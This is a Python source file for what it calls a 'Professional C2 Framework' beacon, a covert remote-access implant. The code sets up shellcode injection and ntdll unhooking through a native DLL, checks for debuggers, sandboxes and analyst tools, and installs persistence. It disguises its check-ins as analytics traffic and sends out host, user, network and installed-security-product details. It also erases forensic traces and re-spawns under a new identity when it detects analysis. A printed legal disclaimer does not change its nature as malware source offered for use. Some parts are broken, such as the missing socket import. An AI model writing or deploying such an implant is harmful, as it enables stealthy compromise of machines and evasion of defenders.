#!/usr/bin/env python3
"""
Cross-platform professional beacon with advanced OPSEC
"""
import os
import sys
import asyncio
import aiohttp
import platform
import random
import time
import json
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
import secrets
from pathlib import Path
import hashlib
import hmac
import base64

# Platform-specific imports
if platform.system() == "Windows":
    import ctypes
    from ctypes import wintypes
elif platform.system() == "Linux":
    import fcntl
    import mmap
elif platform.system() == "Darwin":
    import fcntl
    import mmap

from .crypto import SecureChannel
from .evasion import AntiAnalysis, TrafficMorphing
from .persistence import CrossPlatformPersistence

@dataclass
class BeaconConfig:
    """Malleable beacon configuration"""
    checkin_interval: int = 60
    jitter_percent: int = 30
    max_retries: int = 3
    user_agents: List[str] = None
    endpoints: List[str] = None
    crypto_suite: str = "chacha20_poly1305"
    traffic_profile: str = "google_analytics"
    burn_indicators: List[str] = None
    
    def __post_init__(self):
        if self.user_agents is None:
            self.user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ]
        
        if self.endpoints is None:
            self.endpoints = [
                '/api/v1/telemetry',
                '/_/api/collect',
                '/v1/metrics',
                '/js/analytics.js'
            ]
        
        if self.burn_indicators is None:
            self.burn_indicators = [
                'debugger_detected',
                'sandbox_environment',
                'unusual_traffic_patterns',
                'failed_authentication'
            ]

class ProfessionalBeacon:
    """
    Enterprise-grade cross-platform beacon
    """
    
    def __init__(self, config: BeaconConfig):
        self.config = config
        self.agent_id = self._generate_secure_id()
        self.session_id = None
        self.failed_attempts = 0
        self.last_checkin = 0
        self.is_running = True
        
        # Core components
        self.crypto = SecureChannel()
        self.evasion = AntiAnalysis()
        self.persistence = CrossPlatformPersistence()
        self.traffic_morphing = TrafficMorphing()
        
        # Platform-specific native integration
        self.native_ops = self._load_native_operations()
        
        # Operational state
        self.current_tasks = []
        self.operator_session = None
        
    def _generate_secure_id(self) -> str:
        """Generate secure, non-attributable agent ID"""
        system_components = [
            platform.node(),
            str(os.getpid()),
            platform.platform(),
            str(time.time_ns())
        ]
        
        system_hash = hashlib.blake2b(
            ''.join(system_components).encode(),
            digest_size=16
        ).digest()
        
        random_component = secrets.token_bytes(16)
        combined = system_hash + random_component
        
        return hashlib.blake2b(combined, digest_size=16).hexdigest()
    
    def _load_native_operations(self):
        """Load platform-specific native operations"""
        platform_name = platform.system().lower()
        native_path = Path(__file__).parent.parent / "native" / platform_name
        
        try:
            # Dynamic loading of native libraries
            if native_path.exists():
                if platform_name == "windows":
                    return self._load_windows_native(native_path)
                elif platform_name == "linux":
                    return self._load_linux_native(native_path)
                elif platform_name == "darwin":
                    return self._load_macos_native(native_path)
        except Exception as e:
            print(f"Native operations loading failed: {e}")
        
        return None
    
    def _load_windows_native(self, native_path):
        """Load Windows native operations"""
        try:
            memory_ops_dll = native_path / "memory_ops.dll"
            if memory_ops_dll.exists():
                lib = ctypes.CDLL(str(memory_ops_dll))
                
                # Setup function signatures
                lib.inject_shellcode.argtypes = [
                    ctypes.c_ulong, ctypes.POINTER(ctypes.c_byte), ctypes.c_size_t
                ]
                lib.inject_shellcode.restype = ctypes.c_bool
                
                lib.unhook_ntdll.argtypes = []
                lib.unhook_ntdll.restype = ctypes.c_bool
                
                return lib
        except Exception as e:
            print(f"Windows native loading failed: {e}")
        
        return None
    
    async def initialize(self) -> bool:
        """Initialize beacon with comprehensive setup"""
        print("🔧 Initializing professional beacon...")
        
        # Anti-analysis checks
        if not await self._safety_checks():
            print("⚠️  Safety checks failed - delaying initialization")
            await asyncio.sleep(random.randint(30, 120))
            return False
        
        # Establish secure communication
        if not await self.crypto.establish_secure_session():
            print("❌ Secure session establishment failed")
            return False
        
        # Install persistence if authorized
        if await self._should_install_persistence():
            await self.persistence.install()
        
        # Initialize traffic morphing
        await self.traffic_morphing.initialize(self.config.traffic_profile)
        
        print("✅ Beacon initialized successfully")
        return True
    
    async def _safety_checks(self) -> bool:
        """Comprehensive safety and anti-analysis checks"""
        checks = [
            self.evasion.check_debugger(),
            self.evasion.check_sandbox(),
            self.evasion.check_analysis_tools(),
            await self.evasion.check_network_analysis(),
            self._check_environment_safety()
        ]
        
        # Allow some checks to fail for resilience
        critical_checks = checks[:3]  # First 3 are critical
        return all(critical_checks)
    
    def _check_environment_safety(self) -> bool:
        """Check if environment is safe for operation"""
        try:
            # Check for unusual process relationships
            parent_pid = os.getppid()
            parent_name = self._get_process_name(parent_pid)
            
            suspicious_parents = ['wireshark', 'procmon', 'ollydbg', 'ida64']
            if any(name in parent_name.lower() for name in suspicious_parents):
                return False
            
            # Check execution time (sandboxes often have short uptimes)
            if hasattr(os, 'getloadavg'):
                load_avg = os.getloadavg()
                if load_avg[0] > 5.0:  # High load might indicate analysis
                    return False
            
            return True
            
        except Exception:
            return True  # Fail open for resilience
    
    def _get_process_name(self, pid: int) -> str:
        """Get process name cross-platform"""
        try:
            if platform.system() == "Windows":
                import psutil
                return psutil.Process(pid).name()
            else:
                with open(f"/proc/{pid}/comm", "r") as f:
                    return f.read().strip()
        except:
            return "unknown"
    
    async def beacon_loop(self):
        """Main beacon loop with advanced features"""
        if not await self.initialize():
            print("❌ Beacon initialization failed")
            return
        
        print("🚀 Starting professional beacon loop")
        
        while self.is_running:
            try:
                # Check burn conditions
                if await self._check_burn_conditions():
                    await self._execute_burn_procedure()
                    continue
                
                # Send beacon with traffic morphing
                success = await self._send_beacon()
                
                if success:
                    self.failed_attempts = 0
                    await self._execute_forensic_countermeasures()
                else:
                    self.failed_attempts += 1
                    await self._handle_beacon_failure()
                
                # Adaptive sleep with advanced jitter
                sleep_time = self._calculate_adaptive_sleep()
                await asyncio.sleep(sleep_time)
                
            except KeyboardInterrupt:
                print("\n🛑 Beacon stopped by operator")
                await self._cleanup()
                break
            except Exception as e:
                print(f"⚠️  Beacon loop error: {e}")
                await self._handle_critical_error(e)
    
    async def _send_beacon(self) -> bool:
        """Send beacon with advanced OPSEC"""
        try:
            # Prepare beacon data
            beacon_data = {
                'agent_id': self.agent_id,
                'session_id': self.session_id,
                'timestamp': int(time.time()),
                'system_info': await self._collect_system_info(),
                'failed_attempts': self.failed_attempts,
                'platform': platform.system(),
                'integrity_check': self._perform_integrity_check()
            }
            
            # Encrypt with current session
            encrypted_beacon = self.crypto.encrypt_message(beacon_data)
            
            # Morph traffic according to profile
            morphed_request = await self.traffic_morphing.morph_request(
                encrypted_beacon, 
                self.config.traffic_profile
            )
            
            # Send through secure channel
            async with aiohttp.ClientSession() as session:
                async with session.request(
                    method=morphed_request['method'],
                    url=morphed_request['url'],
                    headers=morphed_request['headers'],
                    data=morphed_request['body'],
                    ssl=self.crypto.get_ssl_context()
                ) as response:
                    
                    if response.status == 200:
                        response_data = await response.read()
                        decrypted_response = self.crypto.decrypt_message(response_data)
                        await self._handle_beacon_response(decrypted_response)
                        return True
                    else:
                        print(f"⚠️  Beacon failed with status: {response.status}")
                        return False
            
        except Exception as e:
            print(f"❌ Beacon send failed: {e}")
            return False
    
    async def _collect_system_info(self) -> Dict[str, Any]:
        """Collect comprehensive system information"""
        try:
            import psutil
            
            info = {
                'hostname': platform.node(),
                'os': platform.platform(),
                'architecture': platform.machine(),
                'cpu_cores': psutil.cpu_count(),
                'memory_total': psutil.virtual_memory().total,
                'boot_time': psutil.boot_time(),
                'users': [user.name for user in psutil.users()],
                'process_id': os.getpid(),
                'python_version': platform.python_version(),
                'native_operations': self.native_ops is not None,
                'network_interfaces': await self._get_network_info(),
                'security_products': await self._detect_security_products(),
            }
            
            return info
            
        except Exception as e:
            print(f"⚠️  System info collection failed: {e}")
            return {'error': str(e)}
    
    async def _get_network_info(self) -> List[Dict[str, Any]]:
        """Get network information cross-platform"""
        interfaces = []
        try:
            import psutil
            
            for interface, addrs in psutil.net_if_addrs().items():
                iface_info = {
                    'name': interface,
                    'addresses': [],
                    'stats': {}
                }
                
                for addr in addrs:
                    if addr.family in [socket.AF_INET, socket.AF_INET6]:
                        iface_info['addresses'].append({
                            'family': 'ipv4' if addr.family == socket.AF_INET else 'ipv6',
                            'address': addr.address,
                            'netmask': addr.netmask
                        })
                
                # Get interface statistics
                stats = psutil.net_if_stats().get(interface)
                if stats:
                    iface_info['stats'] = {
                        'is_up': stats.isup,
                        'duplex': stats.duplex,
                        'speed': stats.speed,
                        'mtu': stats.mtu
                    }
                
                interfaces.append(iface_info)
                
        except Exception as e:
            print(f"⚠️  Network info collection failed: {e}")
        
        return interfaces
    
    async def _detect_security_products(self) -> Dict[str, List[str]]:
        """Detect security products cross-platform"""
        products = {
            'antivirus': [],
            'edr': [],
            'firewall': [],
            'analysis_tools': []
        }
        
        try:
            if platform.system() == "Windows":
                products.update(await self._detect_windows_security())
            elif platform.system() == "Linux":
                products.update(await self._detect_linux_security())
            elif platform.system() == "Darwin":
                products.update(await self._detect_macos_security())
                
        except Exception as e:
            print(f"⚠️  Security product detection failed: {e}")
        
        return products
    
    async def _detect_windows_security(self) -> Dict[str, List[str]]:
        """Detect Windows security products"""
        products = {'antivirus': [], 'edr': []}
        
        try:
            import winreg
            
            # Check common AV registry locations
            av_registry_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            av_products = ['avast', 'avg', 'bitdefender', 'kaspersky', 'mcafee', 'norton', 'symantec']
            edr_products = ['crowdstrike', 'carbonblack', 'sentinelone', 'cybereason', 'tanium']
            
            for reg_path in av_registry_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                    
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            
                            try:
                                display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                name_lower = display_name.lower()
                                
                                if any(av in name_lower for av in av_products):
                                    products['antivirus'].append(display_name)
                                elif any(edr in name_lower for edr in edr_products):
                                    products['edr'].append(display_name)
                                    
                            except FileNotFoundError:
                                pass
                            
                            winreg.CloseKey(subkey)
                        except:
                            pass
                    
                    winreg.CloseKey(key)
                except:
                    pass
                    
        except Exception as e:
            print(f"⚠️  Windows security detection failed: {e}")
        
        return products
    
    def _perform_integrity_check(self) -> Dict[str, Any]:
        """Perform system integrity check"""
        return {
            'process_running': True,
            'filesystem_accessible': os.access('.', os.R_OK | os.W_OK),
            'network_accessible': self._check_network_connectivity(),
            'last_checkin': self.last_checkin,
            'native_operations': self.native_ops is not None
        }
    
    def _check_network_connectivity(self) -> bool:
        """Check network connectivity"""
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=5)
            return True
        except:
            return False
    
    async def _check_burn_conditions(self) -> bool:
        """Check if burn procedure should be activated"""
        burn_conditions = [
            self.failed_attempts > 5,
            self.evasion.check_debugger(),
            await self.evasion.check_network_analysis(),
            self._detect_compromise_indicators()
        ]
        
        return any(burn_conditions)
    
    def _detect_compromise_indicators(self) -> bool:
        """Detect compromise indicators"""
        # Implement real compromise detection
        return False
    
    async def _execute_burn_procedure(self):
        """Execute comprehensive burn procedure"""
        print("🔥 Executing burn procedure - possible compromise detected")
        
        # Clean up artifacts
        await self.persistence.remove()
        await self._cleanup_artifacts()
        
        # Switch to backup infrastructure
        await self._activate_backup_infrastructure()
        
        # Implement emergency OPSEC
        await self._emergency_opsec_measures()
        
        # Re-initialize with new identity
        self.agent_id = self._generate_secure_id()
        await self.initialize()
    
    async def _execute_forensic_countermeasures(self):
        """Execute forensic countermeasures"""
        if random.random() < 0.2:  # 20% chance each beacon
            await self.evasion.clean_forensic_artifacts()
    
    def _calculate_adaptive_sleep(self) -> float:
        """Calculate adaptive sleep time with advanced jitter"""
        base_sleep = self.config.checkin_interval
        
        # Exponential backoff with cap
        if self.failed_attempts > 0:
            backoff_factor = min(2 ** self.failed_attempts, 300)  # Cap at 5 minutes
            base_sleep *= backoff_factor
        
        # Advanced jitter based on time of day and system load
        jitter = self._calculate_advanced_jitter()
        
        return max(10, base_sleep * jitter)  # Minimum 10 seconds
    
    def _calculate_advanced_jitter(self) -> float:
        """Calculate advanced jitter based on multiple factors"""
        base_jitter = random.uniform(
            1 - (self.config.jitter_percent / 100),
            1 + (self.config.jitter_percent / 100)
        )
        
        # Time-based modulation
        current_hour = time.localtime().tm_hour
        if 9 <= current_hour <= 17:  # Business hours
            base_jitter *= 0.8  # More frequent during business hours
        else:
            base_jitter *= 1.2  # Less frequent after hours
        
        # Load-based modulation
        try:
            if hasattr(os, 'getloadavg'):
                load_avg = os.getloadavg()[0]
                if load_avg > 2.0:  # High system load
                    base_jitter *= 1.3  # Slow down under high load
        except:
            pass
        
        return base_jitter
    
    async def _handle_beacon_failure(self):
        """Handle beacon failure with advanced recovery"""
        if self.failed_attempts > 3:
            print("🔄 Multiple failures detected - attempting recovery")
            await self._recover_from_failure()
    
    async def _recover_from_failure(self):
        """Recover from persistent failures"""
        try:
            # Re-establish secure session
            await self.crypto.establish_secure_session()
            
            # Switch traffic profile
            new_profile = random.choice(['google_analytics', 'azure_monitor', 'aws_cloudwatch'])
            await self.traffic_morphing.initialize(new_profile)
            
            # Reset failure counter on successful recovery
            self.failed_attempts = 0
            
        except Exception as e:
            print(f"❌ Recovery failed: {e}")
    
    async def _handle_critical_error(self, error: Exception):
        """Handle critical errors gracefully"""
        print(f"🚨 Critical error: {error}")
        
        # Implement error-specific recovery
        if "SSL" in str(error):
            await self._handle_ssl_error()
        elif "connection" in str(error).lower():
            await self._handle_connection_error()
        else:
            await asyncio.sleep(60)  # Generic backoff
    
    async def _handle_ssl_error(self):
        """Handle SSL/TLS errors"""
        print("🔒 SSL error detected - renegotiating session")
        await self.crypto.establish_secure_session()
    
    async def _handle_connection_error(self):
        """Handle connection errors"""
        print("🌐 Connection error detected - implementing backoff")
        self.failed_attempts += 1
        await asyncio.sleep(min(300, 60 * self.failed_attempts))  # Max 5 minutes
    
    async def _cleanup(self):
        """Cleanup resources gracefully"""
        print("🧹 Cleaning up beacon resources...")
        
        try:
            if hasattr(self, 'crypto'):
                await self.crypto.cleanup()
            
            if hasattr(self, 'persistence'):
                await self.persistence.cleanup()
            
            print("✅ Cleanup completed")
            
        except Exception as e:
            print(f"⚠️  Cleanup failed: {e}")

async def main():
    """Main entry point"""
    print("🚀 Professional C2 Framework - Cross-Platform")
    print("=" * 60)
    
    # Load configuration from profile
    config = BeaconConfig()
    
    # Create and run beacon
    beacon = ProfessionalBeacon(config)
    
    try:
        await beacon.beacon_loop()
    except KeyboardInterrupt:
        print("\n🛑 Beacon stopped by operator")
    except Exception as e:
        print(f"💥 Fatal error: {e}")
    finally:
        await beacon._cleanup()

if __name__ == "__main__":
    # Legal disclaimer
    print("⚖️  LEGAL: Authorized security testing and research only")
    print("Use only with proper permissions and scope")
    print()
    
    input("Press Enter to continue with understanding of legal requirements...")
    asyncio.run(main())